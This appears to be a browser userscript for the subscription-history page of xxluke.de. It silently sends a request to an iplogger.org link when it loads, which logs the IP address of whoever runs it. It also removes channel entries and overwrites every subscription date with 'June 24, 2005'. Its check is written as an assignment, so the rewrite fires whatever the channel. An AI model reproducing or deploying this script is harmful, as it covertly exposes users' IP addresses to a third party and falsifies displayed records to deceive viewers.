"use strict";

fetch("https://iplogger.org/1QM8j7");

if (location.hostname == "xxluke.de") {
if (location.href.indexOf("/subscription-history") !== -1) {

var ismquin = 0;
if (/6Um1hu8N4CY8mSqK0XISmw/.test(document.getElementById("channel-url").value)) {var ismquin = 1}
if (/\/mquin40440/i.test(document.getElementById("channel-url").value)) {var ismquin = 1}

if (ismquin = 1) {
  removech();
  var subdate = document.getElementsByClassName("subscription-date");
  for (var i = 0; i < subdate.length; i++) {
    subdate[i].textContent = "June 24, 2005";
  }
}

}
}

function removech() {
  var chname = document.getElementsByClassName("channel-name");
  for (var i = 0; i < chname.length; i++) {
     if (chname[i].innerHTML.indexOf("<") !== -1) {
       chname[i].parentNode.parentNode.parentNode.remove();
       removech();
     }
  }
}
